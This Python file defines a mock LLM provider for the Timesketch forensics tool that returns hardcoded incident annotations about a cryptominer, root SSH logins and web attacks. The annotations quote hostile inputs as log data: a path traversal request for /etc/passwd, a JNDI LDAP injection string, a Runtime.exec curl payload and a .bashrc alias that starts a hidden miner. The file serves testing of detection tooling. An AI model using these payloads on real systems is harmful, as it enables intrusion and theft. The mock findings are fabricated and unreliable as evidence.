"""Arcadia mock LLM provider."""
import json
from typing import Optional, Any
from timesketch.lib.llms.providers import interface
from timesketch.lib.llms.providers import manager

# file should be placed in timesketch/lib/llms/providers/arcadia.py, and added as import in __init__.py


class Arcadia(interface.LLMProvider):
    """Arcadia mock LLM provider."""

    NAME = "arcadia"

    def generate(self, prompt: str, response_schema: Optional[dict] = None) -> Any:
        """
        Generate mock log analysis results structured by record_id.

        Args:
            prompt: The prompt to use for the generation (ignored).
            response_schema: An optional JSON schema to define the expected
                response format (ignored).

        Returns:
            A JSON string containing record_ids with log details and conclusions.
        """
        # Restructured response: organized by record_id
        mock_responses = [
            {
                "log_name": "fs:stat",
                "record_id": "177",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. Suspicious binary execution."
                        ],
                    }
                ],
                "entities": [
                    {"type": "file", "value": "/usr/bin/dhpcd"},
                    {"type": "threat-intel", "value": "unknown-source"},
                ],
            },
            {
                "log_name": "systemd:journal",
                "record_id": "178",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. High CPU usage detected."
                        ],
                    }
                ],
                "entities": [{"type": "file", "value": "/usr/bin/dhpcd"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "179",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. Suspicious network connection."
                        ],
                    }
                ],
                "entities": [
                    {"type": "file", "value": "/usr/bin/dhpcd"},
                    {"type": "url", "value": "pool.supportxmr.com:80"},
                ],
            },
            {
                "log_name": "fs:stat",
                "record_id": "180",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. Suspicious file attributes."
                        ],
                    }
                ],
                "entities": [{"type": "threat-intel", "value": "vt-sample-high"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "190",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. Suspicious network connection."
                        ],
                    }
                ],
                "entities": [{"type": "file", "value": "/usr/bin/dhpcd"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "191",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. Suspicious network connection."
                        ],
                    }
                ],
                "entities": [{"type": "url", "value": "pool.supportxmr.com:80"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "192",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. Suspicious network connection."
                        ],
                    }
                ],
                "entities": [{"type": "threat-intel", "value": "threat-intel-tool"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "193",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Compromised by malware, likely a cryptocurrency miner. Suspicious file attributes."
                        ],
                    }
                ],
                "entities": [{"type": "yara-rule", "value": "executables_ELF"}],
            },
            {
                "log_name": "fs:stat",
                "record_id": "52",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Malware detected.  Suspicious file attributes on /usr/bin/dhpcd."
                        ],
                    }
                ],
                "entities": [{"type": "file", "value": "/usr/bin/dhpcd"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "53",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Malicious binary '/usr/bin/dhpcd' matches Yara rule 'executables_ELF'."
                        ],
                    }
                ],
                "entities": [
                    {
                        "type": "hash",
                        "value": "5a4bc85ebb3a2263ad3fe8b8575c53e84f6c902f",
                    }
                ],
            },
            {
                "log_name": "syslog:line",
                "record_id": "54",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Malicious binary '/usr/bin/dhpcd' matches Yara rule 'executables_ELF'."
                        ],
                    }
                ],
                "entities": [{"type": "yara-rule", "value": "executables_ELF"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "54",
                "annotations": [
                    {
                        "attack_stage": "execution",
                        "investigative_question": "Are there indicators of known malware on the filesystem?",
                        "conclusions": [
                            "Malware detected. Threat intel hit on /usr/bin/dhpcd."
                        ],
                    }
                ],
                "entities": [{"type": "threat-intel", "value": "threat-intel-tool"}],
            },
            {
                "log_name": "linux:utmp:event",
                "record_id": "14",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Were there any successful SSH logons to the system?",
                        "conclusions": [
                            "Successful SSH login for 'root' from 85.195.192.160."
                        ],
                    }
                ],
                "entities": [{"type": "username", "value": "root"}],
            },
            {
                "log_name": "linux:utmp:event",
                "record_id": "15",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Were there any successful SSH logons to the system?",
                        "conclusions": [
                            "Successful SSH login for 'root' from 85.195.192.160."
                        ],
                    }
                ],
                "entities": [{"type": "ip", "value": "85.195.192.160"}],
            },
            {
                "log_name": "syslog:line",
                "record_id": "16",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Were there any successful SSH logons to the system?",
                        "conclusions": [
                            "Successful SSH login for 'root' from 85.195.192.160 (Romania, tor)."
                        ],
                    }
                ],
                "entities": [
                    {"type": "location", "value": "Romania"},
                    {"type": "indicator", "value": "tor_exit_node"},
                ],
            },
            {
                "log_name": "linux:utmp:event",
                "record_id": "14",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Were there any successful SSH logons to the system?",
                        "conclusions": [
                            "Successful SSH login for 'root' from 43.133.102.2 (China, VPN)."
                        ],
                    }
                ],
                "entities": [
                    {"type": "ip", "value": "43.133.102.2"},
                    {"type": "location", "value": "China"},
                    {"type": "indicator", "value": "vpn_connection"},
                ],
            },
            {
                "log_name": "linux:utmp:event",
                "record_id": "14",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Were there any successful SSH logons to the system?",
                        "conclusions": [
                            "Successful SSH login for 'root' from 84.239.46.144."
                        ],
                    }
                ],
                "entities": [{"type": "username", "value": "root"}],
            },
            {
                "log_name": "linux:utmp:event",
                "record_id": "20",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Were there any successful SSH logons to the system?",
                        "conclusions": [
                            "Successful SSH login for 'root' from 84.239.46.144 (Russia, mandiant_ioc)."
                        ],
                    }
                ],
                "entities": [
                    {"type": "ip", "value": "84.239.46.144"},
                    {"type": "location", "value": "Russia"},
                    {"type": "threat-intel", "value": "mandiant_ioc"},
                ],
            },
            {
                "log_name": "apache:access_log:entry",
                "record_id": "51253628",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Are there signs of web vulnerabilities exploitation?",
                        "conclusions": [
                            "Path transversal  attempt detected from IP 34.82.66.35."
                        ],
                    }
                ],
                "entities": [
                    {"type": "ip", "value": "34.82.66.35"},
                    {
                        "type": "url_path",
                        "value": "GET //login?from=/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                    },
                ],
            },
            {
                "log_name": "apache:access_log:entry",
                "record_id": "51253705",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Are there signs of web vulnerabilities exploitation?",
                        "conclusions": [
                            "Attempted JNDI injection from IP 34.82.66.35 targeting '/contact.php'."
                        ],
                    }
                ],
                "entities": [
                    {"type": "ip", "value": "34.82.66.35"},
                    {
                        "type": "url_path",
                        "value": "/thispathshouldnotexist/?q=${jndi:ldap://28b9bee5ad15f1c81ef6da3b115400010ae763814906690487d774bb.t.cb.goog/}",
                    },
                    {
                        "type": "payload",
                        "value": "jndi:ldap://28b9bee5ad15f1c81ef6da3b115400010ae763814906690487d774bb.t.cb.goog/",
                    },
                ],
            },
            {
                "log_name": "apache:access_log:entry",
                "record_id": "51253706",
                "annotations": [
                    {
                        "attack_stage": "initial_access",
                        "investigative_question": "Are there signs of web vulnerabilities exploitation?",
                        "conclusions": [
                            "Attempted execution of arbitrary code using curl from IP 34.82.66.35."
                        ],
                    }
                ],
                "entities": [
                    {"type": "ip", "value": "34.82.66.35"},
                    {
                        "type": "url_path",
                        "value": "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22curl%20af6cc60ce27900ec3179a86ec2fe4370e70854468347694ee0197586.t.cb.goog%22%29%7D",
                    },
                    {
                        "type": "payload",
                        "value": "af6cc60ce27900ec3179a86ec2fe4370e70854468347694ee0197586.t.cb.goog",
                    },
                ],
            },
            {
                "log_name": "syslog:cron:task_run",
                "record_id": "123",
                "annotations": [
                    {
                        "attack_stage": "persistence",
                        "investigative_question": "Are there any signs of persistence on the system?",
                        "conclusions": [
                            "The root user's crontab includes a command that executes /bin/dhpcd connecting to pool.supportxmr.com:80."
                        ],
                    }
                ],
                "entities": [
                    {"type": "username", "value": "root"},
                    {"type": "executable", "value": "/bin/dhpcd"},
                    {"type": "url", "value": "pool.supportxmr.com:80"},
                ],
            },
            {
                "log_name": "bash:history:entry",
                "record_id": "144",
                "annotations": [
                    {
                        "attack_stage": "persistence",
                        "investigative_question": "Are there any signs of .bashrc (or other rc files) modifications?",
                        "conclusions": ["The user tom's .bashrc file was modified."],
                    }
                ],
                "entities": [
                    {"type": "username", "value": "tom"},
                    {"type": "file", "value": "/home/tom/.bashrc"},
                    {
                        "type": "command",
                        "value": "alias ls='ls --color=auto && ./.hidden/miner.sh &",
                    },
                ],
            },
            {
                "log_name": "bash:history:entry",
                "record_id": "145",
                "annotations": [
                    {
                        "attack_stage": "persistence",
                        "investigative_question": "Are there any signs of .bashrc (or other rc files) modifications?",
                        "conclusions": ["The user mlegin examined bash files."],
                    }
                ],
                "entities": [
                    {"type": "username", "value": "mlegin"},
                    {"type": "file", "value": "/home/mlegin/.bashrc"},
                    {"type": "file", "value": "/home/mlegin/.profile"},
                ],
            },
            {
                "log_name": "syslog:line",
                "record_id": "146",
                "annotations": [
                    {
                        "attack_stage": "persistence",
                        "investigative_question": "Are there any signs of .bashrc (or other rc files) modifications?",
                        "conclusions": ["The user mlegin examined bash files."],
                    }
                ],
                "entities": [
                    {"type": "username", "value": "mlegin"},
                    {"type": "file", "value": "/home/mlegin/.bashrc"},
                    {"type": "file", "value": "/home/mlegin/.profile"},
                ],
            },
        ]

        return json.dumps(mock_responses)


# Register the provider
manager.LLMManager.register_provider(Arcadia)
